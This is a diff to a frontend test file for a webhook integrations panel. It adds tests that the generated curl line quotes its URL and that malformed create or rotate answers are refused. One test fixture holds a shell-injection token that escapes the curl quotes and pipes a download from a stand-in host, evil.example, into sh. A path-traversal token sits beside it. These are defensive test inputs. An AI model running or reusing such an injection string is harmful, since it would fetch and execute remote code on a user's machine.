@@ -333,7 +333,8 @@ describe('IntegrationsTab — create and the copy-once panel', () => {
     expect(q('[data-testid="webhook-reveal-warning"]')!.textContent).toBe('webhooks.reveal.copyNow');
     expect(q('[data-testid="webhook-reveal-url"]')!.textContent).toBe(url);
     expect(q('[data-testid="webhook-reveal"]')!.textContent).toContain('webhooks.reveal.worksWith');
-    expect(q('[data-testid="webhook-reveal-curl"]')!.textContent).toBe(`curl -H 'content-type: application/json' -d '{"content":"hello from cron"}' ${url}`);
+    // the URL is single-quoted: nothing in it reaches the shell
+    expect(q('[data-testid="webhook-reveal-curl"]')!.textContent).toBe(`curl -H 'content-type: application/json' -d '{"content":"hello from cron"}' '${url}'`);
     expect(q('[data-testid="webhook-reveal-secret"]')).toBeNull();
     // no secret, no GitHub setup: the generic hint and the curl line stay
     expect(q('[data-testid="github-setup"]')).toBeNull();
@@ -345,7 +346,7 @@ describe('IntegrationsTab — create and the copy-once panel', () => {
     expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(url);
     expect(toastSuccess).toHaveBeenLastCalledWith('webhooks.reveal.copied');
     await click(q('[data-testid="webhook-reveal-curl-copy"]'));
-    expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(expect.stringContaining(`-d '{"content":"hello from cron"}' ${url}`));
+    expect(navigator.clipboard.writeText).toHaveBeenLastCalledWith(expect.stringContaining(`-d '{"content":"hello from cron"}' '${url}'`));
 
     // closing drops the token: it is nowhere on the page any more
     await click(q('[data-testid="webhook-reveal-done"]'));
@@ -867,8 +868,11 @@ describe('IntegrationsTab — a GitHub secret stays on the panel', () => {
     await click(q('[data-testid="webhook-rotate-dialog-confirm"]'));
     expect(toastError).toHaveBeenCalledWith(expect.stringContaining('serverErrors.webhookNotFound'));
 
-    // the failed copy and the refused rotation were logged, so there is output to search
-    expect(spies[2]).toHaveBeenCalledTimes(2);
+    // the failed copy and the refused rotation were logged, so there is output
+    // to search: the copy three times (the async API's refusal, then the
+    // textarea fallback failing too — jsdom has no execCommand — then the
+    // panel's own warning), the rotation once
+    expect(spies[2]).toHaveBeenCalledTimes(4);
     const outputs = [
       ...toastSuccess.mock.calls, ...toastError.mock.calls,
       ...(toast.info as unknown as Mock).mock.calls, ...(toast.warning as unknown as Mock).mock.calls,
@@ -907,5 +911,142 @@ describe('IntegrationsTab — refusals are logged', () => {
     expect(q('[data-testid="integrations-off"]')).not.toBeNull();
     expect(warn).not.toHaveBeenCalled();
     warn.mockRestore();
+  });
+});
+
+describe('IntegrationsTab — a create/rotate answer that is not a plain URL segment', () => {
+  it.each([
+    ['a token with a path in it', { id: 'wh-new', token: 'tok/../../admin' }],
+    ['a token that leaves the curl quotes', { id: 'wh-new', token: "tok';curl evil.example|sh;'" }],
+    ['an id with a query', { id: 'wh-new?x=1', token: 'tok-1' }],
+  ])('%s: no panel, no URL anywhere, a translated toast, logged without the token', async (_label, bad) => {
+    mockPost.mockResolvedValue({ data: { success: true, data: { ...hook('wh-new', { name: 'Nightly' }), ...bad } } });
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    await render();
+    await click(q('[data-testid="webhook-new"]'));
+    await type(q('#webhook-name') as HTMLInputElement, 'Nightly');
+    await click(q('[data-testid="webhook-create-submit"]'));
+
+    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
+    expect(document.body.innerHTML).not.toContain(bad.token);
+    expect(document.body.innerHTML).not.toContain('/webhooks/');
+    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.invalidUrl');
+    expect(warn).toHaveBeenCalledTimes(1);
+    for (const call of warn.mock.calls) expect(call.join(' ')).not.toContain(bad.token);
+    // the webhook exists all the same: the list is the server's
+    expect(listCalls()).toBe(2);
+    warn.mockRestore();
+  });
+
+  it('a malformed ROTATE answer: same refusal, and an older valid answer arriving later still never lands', async () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    const answers: Array<(v: unknown) => void> = [];
+    mockPost.mockImplementation(() => new Promise((r) => { answers.push(r); }));
+    await render();
+    await click(inRow('wh-1', 'webhook-rotate'));
+    const confirm = q('[data-testid="webhook-rotate-dialog-confirm"]') as HTMLButtonElement;
+    // two rotations in flight (a double click landing before the re-render)
+    await act(async () => { confirm.click(); confirm.click(); });
+    await flush();
+    expect(mockPost).toHaveBeenCalledTimes(2);
+
+    // the NEWER one answers first, malformed: refused
+    await act(async () => { answers[1]({ data: { success: true, data: { ...hook('wh-1'), token: 'bad token' } } }); });
+    await flush();
+    expect(toastError).toHaveBeenCalledWith('webhooks.reveal.invalidUrl');
+    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
+
+    // the older one's token was killed by the newer rotation: it never shows
+    await act(async () => { answers[0]({ data: { success: true, data: { ...hook('wh-1'), token: 'old-tok' } } }); });
+    await flush();
+    expect(q('[data-testid="webhook-reveal"]')).toBeNull();
+    expect(document.body.innerHTML).not.toContain('old-tok');
+    warn.mockRestore();
+  });
+});
+
+describe('IntegrationsTab — the cap follows the server', () => {
+  const limitsCalls = () => mockGet.mock.calls.filter(([url]) => url === '/servers/srv-1/limits').length;
+
+  it('a webhook:changed hint reloads the cap with the list: an admin freezing creation (10 → 0) shows', async () => {
+    await render();
+    expect(limitsCalls()).toBe(1);
+    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);
+
+    maxWebhooks = 0;
+    const [handler] = changedHandlers();
+    await act(async () => { handler({ serverId: 'srv-1' }); });
+    await flush();
+    expect(limitsCalls()).toBe(2);
+    const button = q('[data-testid="webhook-new"]') as HTMLButtonElement;
+    expect(button.disabled).toBe(true);
+    expect(button.title).toBe('webhooks.frozen');
+  });
+
+  it('a reconnect reloads it too: 0 → 10 re-enables "New webhook"', async () => {
+    maxWebhooks = 0;
+    await render();
+    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
+
+    maxWebhooks = 10;
+    await act(async () => { reconnect.callbacks[0](); });
+    await flush();
+    expect(limitsCalls()).toBe(2);
+    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(false);
+    expect(q('[data-testid="integrations-count"]')!.textContent).toContain('webhooks.usage{"used":2,"max":10}');
+  });
+
+  it('a failed cap reload is logged and keeps the last known cap', async () => {
+    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
+    maxWebhooks = 2;
+    await render();
+    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).disabled).toBe(true);
+    const base = mockGet.getMockImplementation()!;
+    mockGet.mockImplementation((url: string) => (url === '/servers/srv-1/limits' ? Promise.reject(new Error('offline')) : base(url)));
+    const [handler] = changedHandlers();
+    await act(async () => { handler({ serverId: 'srv-1' }); });
+    await flush();
+    expect(warn).toHaveBeenCalledWith('[Integrations] Failed to load limits:', 'offline');
+    expect((q('[data-testid="webhook-new"]') as HTMLButtonElement).title).toBe('webhooks.atCap{"max":2}');
+    warn.mockRestore();
+  });
+});
+
+describe('IntegrationsTab — channel:deleted (a cascade deletes the webhooks, no webhook:changed)', () => {
+  const deletedHandlers = () => socket.on.mock.calls
+    .filter(([e]) => e === 'channel:deleted')
+    .map(([, h]) => h as (d: { channelId: string; serverId: string }) => void);
+
+  it('a channel of this server refetches the list (and the cap); another server\'s does not', async () => {
+    await render();
+    expect(deletedHandlers()).toHaveLength(1);
+    const [handler] = deletedHandlers();
+
+    await act(async () => { handler({ channelId: 'ch-x', serverId: 'srv-2' }); });
+    await flush();
+    expect(listCalls()).toBe(1);
+
+    list = [hook('wh-2', { type: 'github', enabled: false, channelId: 'ch-gone', createdBy: null })];
+    await act(async () => { handler({ channelId: 'ch-1', serverId: 'srv-1' }); });
+    await flush();
+    expect(listCalls()).toBe(2);
+    expect(q('[data-testid="webhook-row-wh-1"]')).toBeNull();
+    expect(row('wh-2')).not.toBeNull();
+  });
+
+  it('a malformed payload is ignored, never thrown', async () => {
+    await render();
+    const [handler] = deletedHandlers();
+    await act(async () => { handler(undefined as unknown as { channelId: string; serverId: string }); });
+    await flush();
+    expect(listCalls()).toBe(1);
+  });
+
+  it('unsubscribes on unmount, with the same handler', async () => {
+    await render();
+    const [handler] = deletedHandlers();
+    act(() => root.unmount());
+    expect(socket.off).toHaveBeenCalledWith('channel:deleted', handler);
+    root = createRoot(container);
   });
 });
